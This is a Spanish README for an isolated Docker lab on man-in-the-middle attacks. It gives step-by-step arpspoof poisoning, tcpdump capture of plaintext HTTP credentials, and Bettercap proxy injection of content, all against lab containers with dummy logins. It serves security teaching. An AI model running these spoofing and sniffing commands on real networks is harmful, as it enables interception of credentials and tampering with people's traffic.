# Laboratorio MitM con Bettercap (Docker)

Entorno aislado para practicar ataques Man-in-the-Middle: ARP spoofing,
captura de credenciales HTTP y modificación de contenido HTTP.

## IMPORTANTE (leer antes de empezar)

- El módulo `arp.spoof` de Bettercap NO funciona de forma fiable dentro de
  contenedores Docker. Por eso el envenenamiento ARP lo hacemos con `arpspoof`
  (ya incluido en la imagen del atacante). Bettercap se usa para la
  modificación de contenido (Prueba 2).
- En Windows hay que usar **Docker nativo dentro de WSL**, NO el motor de
  Docker Desktop (su red rompe el reenvío entre contenedores).

## Requisitos e instalación

### Windows (WSL2 + Ubuntu)

1. Instalar WSL2 y Ubuntu (PowerShell como administrador) y reiniciar:
       wsl --install -d Ubuntu-22.04

2. Si tienes Docker Desktop, desactiva su integración con Ubuntu:
   Docker Desktop -> Settings -> Resources -> WSL Integration -> apaga Ubuntu.

3. Entrar en Ubuntu:
       wsl -d Ubuntu-22.04 -u root

4. Instalar Docker nativo dentro de Ubuntu:
       curl -fsSL https://get.docker.com | sh
       service docker start

### Linux (nativo o VM)

       curl -fsSL https://get.docker.com | sh
       service docker start

## Puesta en marcha

1. Clonar y entrar:
       git clone <URL-DEL-REPO> lab_mitm
       cd lab_mitm

2. Arreglar finales de línea (por si se clona desde Windows):
       sed -i 's/\r$//' servidor/start.sh atacante/start.sh atacante/caplets/*.cap atacante/caplets/*.js

3. Construir y levantar:
       docker compose up -d --build

4. Comprobar que los 3 contenedores están Up:
       docker compose ps

## Topología (red 172.20.0.0/24, aislada)

| Nodo         | IP          | Rol                               |
|--------------|-------------|-----------------------------------|
| servidor-web | 172.20.0.10 | Login en HTTP (80) y HTTPS (443)  |
| victima      | 172.20.0.20 | Cliente al que se espía           |
| atacante     | 172.20.0.30 | Bettercap + arpspoof              |

Comprobar que el servidor responde:
       docker compose exec victima curl -s http://172.20.0.10/

## Prueba 1 - ARP spoofing + captura de credenciales HTTP

Necesitas 2 terminales de Ubuntu (ambas en la carpeta lab_mitm).

Terminal 1 (envenenar en segundo plano + capturar):
       docker compose exec -d atacante arpspoof -i eth0 -t 172.20.0.20 172.20.0.10
       docker compose exec atacante tcpdump -i eth0 -A -s0 'tcp port 80 and host 172.20.0.20'

Terminal 2 (la víctima hace login):
       docker compose exec victima curl -s http://172.20.0.10/login -d "usuario=paciente01&password=hospital1234"

En la Terminal 1 verás las credenciales en texto claro:
       usuario=paciente01&password=hospital1234

Parar: Ctrl+C en el tcpdump.

## Prueba 2 - Modificación de contenido HTTP

Necesitas 3 terminales.

Terminal A (envenenar):
       docker compose exec atacante arpspoof -i eth0 -t 172.20.0.20 172.20.0.10

Terminal B (bettercap con el proxy que reescribe la respuesta):
       docker compose exec atacante bettercap -iface eth0
   y dentro del prompt:
       set http.proxy.script /caplets/proxy.js
       http.proxy on

Terminal C (la víctima pide la página):
       docker compose exec victima curl -s http://172.20.0.10/

La víctima recibe la página con una línea inyectada que el servidor nunca envió:
       <h1>PAGINA MODIFICADA POR MITM - CAI</h1>

## Parar todo

       docker compose down
